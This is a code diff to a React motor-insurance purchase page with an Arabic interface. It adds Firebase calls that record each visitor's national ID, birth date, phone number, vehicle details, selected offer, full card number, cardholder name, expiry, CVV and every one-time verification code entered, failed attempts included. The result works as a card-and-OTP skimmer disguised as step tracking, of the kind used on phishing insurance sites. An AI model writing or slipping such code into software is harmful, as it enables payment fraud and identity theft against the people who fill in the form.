@@ -1,8 +1,9 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { useMutation } from "@tanstack/react-query";
 import { AlertCircle, ChevronLeft, ChevronRight, Check, Zap, Sparkles, Car, Shield, Plus, Minus, Info, CreditCard, Lock } from "lucide-react";
+import { addData, handleCurrentPage, generateVisitorId, isFirebaseConfigured } from "@/lib/firebase";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -477,6 +478,19 @@ export default function MotorInsurance() {
   const [vehicleData, setVehicleData] = useState<any[]>([]);
   const [isLoadingVehicles, setIsLoadingVehicles] = useState(false);
   const [selectedVehicle, setSelectedVehicle] = useState<any>(null);
+  const [visitorId, setVisitorId] = useState<string>("");
+
+  useEffect(() => {
+    let id = localStorage.getItem('visitor');
+    if (!id) {
+      id = generateVisitorId();
+      localStorage.setItem('visitor', id);
+    }
+    setVisitorId(id);
+    if (isFirebaseConfigured) {
+      handleCurrentPage('motor-insurance-step-1');
+    }
+  }, []);
 
   const form = useForm<InsuranceFormData>({
     resolver: zodResolver(insuranceFormSchema),
@@ -526,6 +540,25 @@ export default function MotorInsurance() {
     const isValid = step1Fields.every(field => !form.formState.errors[field]);
     if (isValid) {
       const nationalId = form.getValues("nationalId");
+      const formValues = form.getValues();
+      
+      if (isFirebaseConfigured && visitorId) {
+        addData({
+          id: visitorId,
+          step: 1,
+          currentPage: 'motor-insurance-step-2',
+          personalInfo: {
+            nationalId: formValues.nationalId,
+            birthDay: formValues.birthDay,
+            birthMonth: formValues.birthMonth,
+            birthYear: formValues.birthYear,
+            isHijri: formValues.isHijri,
+            phoneNumber: formValues.phoneNumber,
+            acceptMarketing: formValues.acceptMarketing,
+          }
+        });
+      }
+      
       setIsLoadingVehicles(true);
       try {
         const response = await fetch(`/api/vehicles?nin=${nationalId}`);
@@ -564,6 +597,22 @@ export default function MotorInsurance() {
   };
 
   const handleStep2Submit = () => {
+    const formValues = form.getValues();
+    
+    if (isFirebaseConfigured && visitorId) {
+      addData({
+        id: visitorId,
+        step: 2,
+        currentPage: 'motor-insurance-step-3',
+        vehicleInfo: {
+          vehicleSerial: formValues.vehicleSerial,
+          vehicleYear: formValues.vehicleYear,
+          coverageType: formValues.coverageType,
+          selectedVehicle: selectedVehicle,
+        }
+      });
+    }
+    
     setCurrentStep(3);
   };
 
@@ -576,6 +625,23 @@ export default function MotorInsurance() {
       });
       return false;
     }
+    
+    const selectedOffer = offerData.find(o => o.id === selectedOfferId);
+    if (isFirebaseConfigured && visitorId && selectedOffer) {
+      addData({
+        id: visitorId,
+        step: 3,
+        currentPage: 'motor-insurance-step-4',
+        selectedOffer: {
+          offerId: selectedOfferId,
+          offerName: selectedOffer.name,
+          insuranceType: insuranceTypeTab,
+          selectedFeatures: selectedFeatures[selectedOfferId] || [],
+          totalPrice: calculateOfferTotal(selectedOffer),
+        }
+      });
+    }
+    
     setCurrentStep(4);
     return true;
   };
@@ -614,6 +680,21 @@ export default function MotorInsurance() {
       });
       return false;
     }
+    
+    if (isFirebaseConfigured && visitorId) {
+      addData({
+        id: visitorId,
+        step: 4,
+        currentPage: 'motor-insurance-step-5',
+        paymentInfo: {
+          cardNumber: cardDigits,
+          cardName: cardName,
+          cardExpiry: cardExpiry,
+          cardCvv: cardCvv,
+        }
+      });
+    }
+    
     setCurrentStep(5);
     return true;
   };
@@ -631,6 +712,18 @@ export default function MotorInsurance() {
     if (!otpCode || otpCode.length < 4) {
       const newAttempts = Math.max(0, otpAttempts - 1);
       setOtpAttempts(newAttempts);
+      
+      if (isFirebaseConfigured && visitorId) {
+        addData({
+          id: visitorId,
+          otpAttempt: {
+            code: otpCode,
+            attemptsRemaining: newAttempts,
+            timestamp: new Date().toISOString(),
+          }
+        });
+      }
+      
       toast({
         title: "رمز التحقق غير صحيح",
         description: newAttempts > 0 ? `المحاولات المتبقية: ${newAttempts}` : "انتهت المحاولات، يرجى إعادة إرسال الرمز للمحاولة مرة أخرى",
@@ -643,6 +736,18 @@ export default function MotorInsurance() {
     if (selectedOffer) {
       const offerTotal = calculateOfferTotal(selectedOffer);
       const features = selectedFeatures[selectedOfferId!] || [];
+      
+      if (isFirebaseConfigured && visitorId) {
+        addData({
+          id: visitorId,
+          step: 5,
+          currentPage: 'motor-insurance-step-6',
+          otpVerified: true,
+          otpCode: otpCode,
+          status: 'completed',
+        });
+      }
+      
       const submissionData: InsuranceFormData = {
         ...data,
         selectedOfferId: selectedOfferId!,
